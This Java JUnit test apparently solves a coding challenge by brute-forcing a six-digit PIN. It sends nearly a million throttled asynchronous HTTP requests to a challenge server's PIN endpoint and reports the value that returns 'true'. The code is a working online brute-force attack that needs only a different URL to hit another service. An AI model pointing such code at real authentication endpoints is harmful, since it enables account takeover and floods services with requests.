package de.axelspringer.ideas.mate.six;

import de.axelspringer.ideas.mate.common.RestClient;
import org.apache.commons.lang3.StringUtils;
import org.asynchttpclient.AsyncHttpClient;
import org.asynchttpclient.ListenableFuture;
import org.asynchttpclient.Response;
import org.junit.Test;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.Future;
import java.util.concurrent.atomic.AtomicInteger;

import static org.asynchttpclient.Dsl.asyncHttpClient;

public class BruteForcePinTest {

    private AtomicInteger counter = new AtomicInteger(0);
    private long start = System.currentTimeMillis();
    private Random random = new Random();

    @Test
    public void testBruteForeceAttack() throws Exception {
        List<String> values = new ArrayList<>();

        for (int i = 0; i < 999999; i++) {
            values.add(StringUtils.leftPad("" + i, 6, "0"));

        }

//        ForkJoinPool customThreadPool = new ForkJoinPool(250);
//        customThreadPool.submit(() -> {
//            values.parallelStream().forEach((value) -> processNumber(value));
////            aList.parallelStream().reduce(0L, Long::sum);
//        }).get();

//        values.parallelStream().forEach(processNumber(start));
        List<Future<Response>> results = new ArrayList<>();
        AsyncHttpClient asyncHttpClient = asyncHttpClient();
        for (int i = 0; i < 999999; i++) {

            final int pin = i;

            String url = "http://mate-challenge.herokuapp.com/six/cheesecake/pin?pin=";
//            String url = "http://localhost:8080/six/cheesecake/pin?pin=";
            ListenableFuture<Response> whenResponse = asyncHttpClient.prepareGet(url + i).execute();
            results.add(whenResponse);
            whenResponse.addListener((Runnable) () -> {
                try {
                    counter.incrementAndGet();
                    Response response = whenResponse.get();
                    if (response.getResponseBody().equalsIgnoreCase("true")) {
                        // FIXME Remove System.out
                        System.out.println("### FOUND IT!!! ### pin=" + pin + " ###" + response);
                    }
                    whenResponse.done();
                } catch (InterruptedException | ExecutionException e) {
                    e.printStackTrace();
                }
            }, null);
            if (results.size() % 1000 == 0) {
                long durationInMs = (System.currentTimeMillis() - start);
                long durationInS = durationInMs / 1000L;

                // FIXME Remove System.out
                System.out.println(results.size() + " in " + durationInS + "s and finished " + counter.get() + " (" + (counter.get() / durationInS) + " req/s)");

                while (results.size() - counter.get() > 1000) {
                    // FIXME Remove System.out
                    System.out.println("Sleep...");
                    Thread.sleep(500);
                }

            }
        }
    }

    private void processNumber(String value) {
//        try {
//            Thread.sleep(random.nextInt(100));
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//        }
        counter.incrementAndGet();

        long durationInMs = (System.currentTimeMillis() - start);
        long durationInS = durationInMs / 1000L;
        // FIXME Remove System.out
        if (counter.get() % 100 == 0) {
            System.out.println(counter.get() + " in " + durationInS + "s (" + (counter.get() / durationInS) + " req/s, " + (durationInMs / counter.get()) + " ms avg)");
        }

        String restResult = RestClient.get("http://localhost:8080/six/cheesecake/pin?pin=" + value, String.class);
//        String restResult = RestClient.get("http://mate-challenge.herokuapp.com/six/cheesecake/pin?pin=" + value, String.class);

        boolean isCorrectAnswer = "true".equalsIgnoreCase(restResult);
        if (isCorrectAnswer) {
            System.out.println("TRUE WAS: " + value);
        }
    }

}
